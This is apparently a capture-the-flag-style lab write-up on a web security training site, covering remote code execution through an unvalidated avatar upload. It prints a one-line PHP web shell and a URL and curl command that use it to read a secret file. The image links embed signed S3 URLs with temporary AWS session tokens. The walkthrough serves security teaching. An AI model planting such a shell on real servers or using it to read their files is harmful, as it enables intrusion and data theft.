# Remote code execution via web shell upload

### Goal - 

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`

### Analysis/Exploitation -

Login as user `wiener`:

**In the lab’s background, it said:**

> This lab contains a vulnerable image upload function. It doesn’t perform any validation on the files users upload before storing them on the server’s filesystem.

Now, If the application doesn’t do any validation on user’s file upload, an attack could upload a web shell to the web server’s filesystem!

**But before we do that, let’s upload a normal file, and intercept the request via Burp Suite:**

When we clicked the `Upload` button, a POST request will be sent to `/my-account/avatar`, with parameters `name='user'`& `name='csrf'` at end after image data.

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/198510e0-dccb-4a69-84aa-c4636e8207cf/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4663G22UN3F%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T215541Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAg9zmkNA%2FfjKqY3SEvKOtujyMAZyx7yIQcL7QOHds6lAiEA8JeGxZMVDrMPmEcIcQdV3gScJKXWlVTqixk0AOk%2F0JYqiAQIrv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDFrhh15ZFyjVhjl0NircA8s%2Bx49WXIcZjakyVbBxYGB0tSYs4IF5OENQcvw9FSANMm6dUPqpcF%2BZwGazUCa%2FH0U0khvWR0kxl%2FgeDWaaMuz0X%2FXPeIErMbd1t%2Bve7j45683kkL44RrjeE0tYMx%2FOPBTCkerL%2BaUlN2dXt16M3Y1SQlb90lhVJdNYfaQdbgyYFpbbKgTKSInoz4sCdrqZlSUHfhKk2SL4NQwSYAYNE3Qlo%2BlBF9O2E5NmWOUo320z7SIzr24py7UeBF3qTlwipiZims7YPaSvm80CHjYK9lOrIo6am08nNeIr%2B95HFZucAbdh6VdcCnd5iJedx1v2pczLbfr8pc6nA0zbw2sGo5E%2BibewV1vWi8L5Pp7hfXYR3xfy0WOqaJEzO4%2FttXfe7x6eWqp%2BqMEtZFbp6cF5AGcRibgDsa3eRTd2QVX8WVI5Di2Dtsv0D5PSyqhqOsBLsc7enkBg3hwLtYgKLnvVJz3QaramsJcV5cHWcdSgPl7UDgHOaDz7Ow8VTwNs3WI1d7pHWBrQw8Q28nVmJWSxs3euY5xr5%2BLA%2BYxxUiTwD2bUTLCTdBMHrKQwoTS9dDJ6nmJhRWeVaRASTmR7SQGiOYVDZhzy2jpjt3VORo2WA4nMSwaFTHnosLG8yIM5MPaDo9QGOqUButj%2BZKJYjC2m62pQgW31niYEXWIbyin9k2tPGiWlJrFKpjYJNjJgVm9%2B1nhwaQSTT36jhB%2BBQU%2FhoAppT0w07Z78IRf7%2FpeUJr%2B3Cc39IV%2BiASCiKc1GVtdMxRbZ1pBWnKS%2BkKlm8AZ5VE5VnVlcynU9u1bza0piSaBKHck31XhSyKgFYZkJMY1vUAACD5njdHaOzxQbwvNBdGLCgQSO%2FQW1%2Fd%2Bw&X-Amz-Signature=06e9cc0787348401af924a529eb85217dd5eb3d12eb4b6c946ff7f866cb281d9&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

when we click “Back to My Account”, notice that image was fetched using a `GET` request to `/files/avatars/<YOUR-IMAGE>`. 

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/cde8a822-35f5-47fc-9b42-f886f39b12b4/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4663G22UN3F%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T215541Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAg9zmkNA%2FfjKqY3SEvKOtujyMAZyx7yIQcL7QOHds6lAiEA8JeGxZMVDrMPmEcIcQdV3gScJKXWlVTqixk0AOk%2F0JYqiAQIrv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDFrhh15ZFyjVhjl0NircA8s%2Bx49WXIcZjakyVbBxYGB0tSYs4IF5OENQcvw9FSANMm6dUPqpcF%2BZwGazUCa%2FH0U0khvWR0kxl%2FgeDWaaMuz0X%2FXPeIErMbd1t%2Bve7j45683kkL44RrjeE0tYMx%2FOPBTCkerL%2BaUlN2dXt16M3Y1SQlb90lhVJdNYfaQdbgyYFpbbKgTKSInoz4sCdrqZlSUHfhKk2SL4NQwSYAYNE3Qlo%2BlBF9O2E5NmWOUo320z7SIzr24py7UeBF3qTlwipiZims7YPaSvm80CHjYK9lOrIo6am08nNeIr%2B95HFZucAbdh6VdcCnd5iJedx1v2pczLbfr8pc6nA0zbw2sGo5E%2BibewV1vWi8L5Pp7hfXYR3xfy0WOqaJEzO4%2FttXfe7x6eWqp%2BqMEtZFbp6cF5AGcRibgDsa3eRTd2QVX8WVI5Di2Dtsv0D5PSyqhqOsBLsc7enkBg3hwLtYgKLnvVJz3QaramsJcV5cHWcdSgPl7UDgHOaDz7Ow8VTwNs3WI1d7pHWBrQw8Q28nVmJWSxs3euY5xr5%2BLA%2BYxxUiTwD2bUTLCTdBMHrKQwoTS9dDJ6nmJhRWeVaRASTmR7SQGiOYVDZhzy2jpjt3VORo2WA4nMSwaFTHnosLG8yIM5MPaDo9QGOqUButj%2BZKJYjC2m62pQgW31niYEXWIbyin9k2tPGiWlJrFKpjYJNjJgVm9%2B1nhwaQSTT36jhB%2BBQU%2FhoAppT0w07Z78IRf7%2FpeUJr%2B3Cc39IV%2BiASCiKc1GVtdMxRbZ1pBWnKS%2BkKlm8AZ5VE5VnVlcynU9u1bza0piSaBKHck31XhSyKgFYZkJMY1vUAACD5njdHaOzxQbwvNBdGLCgQSO%2FQW1%2Fd%2Bw&X-Amz-Signature=e25ff7621566a4359a904e305f39895a2f85fad7ad62ebf3be2f7fb3a94f1bf3&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/05c4efad-f9bd-4978-bd13-a5d5925b051b/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4663G22UN3F%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T215541Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAg9zmkNA%2FfjKqY3SEvKOtujyMAZyx7yIQcL7QOHds6lAiEA8JeGxZMVDrMPmEcIcQdV3gScJKXWlVTqixk0AOk%2F0JYqiAQIrv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDFrhh15ZFyjVhjl0NircA8s%2Bx49WXIcZjakyVbBxYGB0tSYs4IF5OENQcvw9FSANMm6dUPqpcF%2BZwGazUCa%2FH0U0khvWR0kxl%2FgeDWaaMuz0X%2FXPeIErMbd1t%2Bve7j45683kkL44RrjeE0tYMx%2FOPBTCkerL%2BaUlN2dXt16M3Y1SQlb90lhVJdNYfaQdbgyYFpbbKgTKSInoz4sCdrqZlSUHfhKk2SL4NQwSYAYNE3Qlo%2BlBF9O2E5NmWOUo320z7SIzr24py7UeBF3qTlwipiZims7YPaSvm80CHjYK9lOrIo6am08nNeIr%2B95HFZucAbdh6VdcCnd5iJedx1v2pczLbfr8pc6nA0zbw2sGo5E%2BibewV1vWi8L5Pp7hfXYR3xfy0WOqaJEzO4%2FttXfe7x6eWqp%2BqMEtZFbp6cF5AGcRibgDsa3eRTd2QVX8WVI5Di2Dtsv0D5PSyqhqOsBLsc7enkBg3hwLtYgKLnvVJz3QaramsJcV5cHWcdSgPl7UDgHOaDz7Ow8VTwNs3WI1d7pHWBrQw8Q28nVmJWSxs3euY5xr5%2BLA%2BYxxUiTwD2bUTLCTdBMHrKQwoTS9dDJ6nmJhRWeVaRASTmR7SQGiOYVDZhzy2jpjt3VORo2WA4nMSwaFTHnosLG8yIM5MPaDo9QGOqUButj%2BZKJYjC2m62pQgW31niYEXWIbyin9k2tPGiWlJrFKpjYJNjJgVm9%2B1nhwaQSTT36jhB%2BBQU%2FhoAppT0w07Z78IRf7%2FpeUJr%2B3Cc39IV%2BiASCiKc1GVtdMxRbZ1pBWnKS%2BkKlm8AZ5VE5VnVlcynU9u1bza0piSaBKHck31XhSyKgFYZkJMY1vUAACD5njdHaOzxQbwvNBdGLCgQSO%2FQW1%2Fd%2Bw&X-Amz-Signature=608caef71b4ff4e78cd528aac6bd1add9023b2823de9f80de530ce1e5df47d93&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

Now we know **the exact location of the uploaded file: **`/files/avatars/test.png`**.**

Try to upload PHP web shell

**Payload:**`<?php system($_GET['cmd']); ?>`

> 💡 **<?php system($_GET['cmd']); ?>**
$**_GET** Can collect data that was sent in the URL or submitted in an HTML form.
The command to be executed is obtained from the user's input via the $_GET superglobal array. In this case, the user is expected to pass the command as a query parameter named 'cmd' in the URL.

For example, if the script is hosted at example.com/shell.php, a user could execute a command by visiting:
**http://example.com/shell.php?cmd=ls%20-l**

Use the avatar upload function to upload malicious PHP file

Calling the file will output the content of the secret file:

```text
https://0a7b004f038d0eb58082174300b30087.web-security-academy.net/files/avatars/webShell.php/?cmd=cat%20/home/carlos/secret
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/fa72d605-48e2-4df2-b706-c8dbcaacd18d/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4663G22UN3F%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T215541Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAg9zmkNA%2FfjKqY3SEvKOtujyMAZyx7yIQcL7QOHds6lAiEA8JeGxZMVDrMPmEcIcQdV3gScJKXWlVTqixk0AOk%2F0JYqiAQIrv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDFrhh15ZFyjVhjl0NircA8s%2Bx49WXIcZjakyVbBxYGB0tSYs4IF5OENQcvw9FSANMm6dUPqpcF%2BZwGazUCa%2FH0U0khvWR0kxl%2FgeDWaaMuz0X%2FXPeIErMbd1t%2Bve7j45683kkL44RrjeE0tYMx%2FOPBTCkerL%2BaUlN2dXt16M3Y1SQlb90lhVJdNYfaQdbgyYFpbbKgTKSInoz4sCdrqZlSUHfhKk2SL4NQwSYAYNE3Qlo%2BlBF9O2E5NmWOUo320z7SIzr24py7UeBF3qTlwipiZims7YPaSvm80CHjYK9lOrIo6am08nNeIr%2B95HFZucAbdh6VdcCnd5iJedx1v2pczLbfr8pc6nA0zbw2sGo5E%2BibewV1vWi8L5Pp7hfXYR3xfy0WOqaJEzO4%2FttXfe7x6eWqp%2BqMEtZFbp6cF5AGcRibgDsa3eRTd2QVX8WVI5Di2Dtsv0D5PSyqhqOsBLsc7enkBg3hwLtYgKLnvVJz3QaramsJcV5cHWcdSgPl7UDgHOaDz7Ow8VTwNs3WI1d7pHWBrQw8Q28nVmJWSxs3euY5xr5%2BLA%2BYxxUiTwD2bUTLCTdBMHrKQwoTS9dDJ6nmJhRWeVaRASTmR7SQGiOYVDZhzy2jpjt3VORo2WA4nMSwaFTHnosLG8yIM5MPaDo9QGOqUButj%2BZKJYjC2m62pQgW31niYEXWIbyin9k2tPGiWlJrFKpjYJNjJgVm9%2B1nhwaQSTT36jhB%2BBQU%2FhoAppT0w07Z78IRf7%2FpeUJr%2B3Cc39IV%2BiASCiKc1GVtdMxRbZ1pBWnKS%2BkKlm8AZ5VE5VnVlcynU9u1bza0piSaBKHck31XhSyKgFYZkJMY1vUAACD5njdHaOzxQbwvNBdGLCgQSO%2FQW1%2Fd%2Bw&X-Amz-Signature=c2670a046294224c4e827068cc93f83ebd6b8f0592c8e5f920502b49ea122579&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

via command line using curl

```bash
curl https://0a7b004f038d0eb58082174300b30087.web-security-academy.net/files/avatars/webShell.php --get --data-urlencode "cmd=cat /home/carlos/secret"
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/47af05bc-20ed-4450-980e-c8b7d176fdda/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4663G22UN3F%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T215541Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAg9zmkNA%2FfjKqY3SEvKOtujyMAZyx7yIQcL7QOHds6lAiEA8JeGxZMVDrMPmEcIcQdV3gScJKXWlVTqixk0AOk%2F0JYqiAQIrv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDFrhh15ZFyjVhjl0NircA8s%2Bx49WXIcZjakyVbBxYGB0tSYs4IF5OENQcvw9FSANMm6dUPqpcF%2BZwGazUCa%2FH0U0khvWR0kxl%2FgeDWaaMuz0X%2FXPeIErMbd1t%2Bve7j45683kkL44RrjeE0tYMx%2FOPBTCkerL%2BaUlN2dXt16M3Y1SQlb90lhVJdNYfaQdbgyYFpbbKgTKSInoz4sCdrqZlSUHfhKk2SL4NQwSYAYNE3Qlo%2BlBF9O2E5NmWOUo320z7SIzr24py7UeBF3qTlwipiZims7YPaSvm80CHjYK9lOrIo6am08nNeIr%2B95HFZucAbdh6VdcCnd5iJedx1v2pczLbfr8pc6nA0zbw2sGo5E%2BibewV1vWi8L5Pp7hfXYR3xfy0WOqaJEzO4%2FttXfe7x6eWqp%2BqMEtZFbp6cF5AGcRibgDsa3eRTd2QVX8WVI5Di2Dtsv0D5PSyqhqOsBLsc7enkBg3hwLtYgKLnvVJz3QaramsJcV5cHWcdSgPl7UDgHOaDz7Ow8VTwNs3WI1d7pHWBrQw8Q28nVmJWSxs3euY5xr5%2BLA%2BYxxUiTwD2bUTLCTdBMHrKQwoTS9dDJ6nmJhRWeVaRASTmR7SQGiOYVDZhzy2jpjt3VORo2WA4nMSwaFTHnosLG8yIM5MPaDo9QGOqUButj%2BZKJYjC2m62pQgW31niYEXWIbyin9k2tPGiWlJrFKpjYJNjJgVm9%2B1nhwaQSTT36jhB%2BBQU%2FhoAppT0w07Z78IRf7%2FpeUJr%2B3Cc39IV%2BiASCiKc1GVtdMxRbZ1pBWnKS%2BkKlm8AZ5VE5VnVlcynU9u1bza0piSaBKHck31XhSyKgFYZkJMY1vUAACD5njdHaOzxQbwvNBdGLCgQSO%2FQW1%2Fd%2Bw&X-Amz-Signature=3b162a65f39e85dadf7038318c1ae2026acf0e52d8898adb0da9195199820185&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
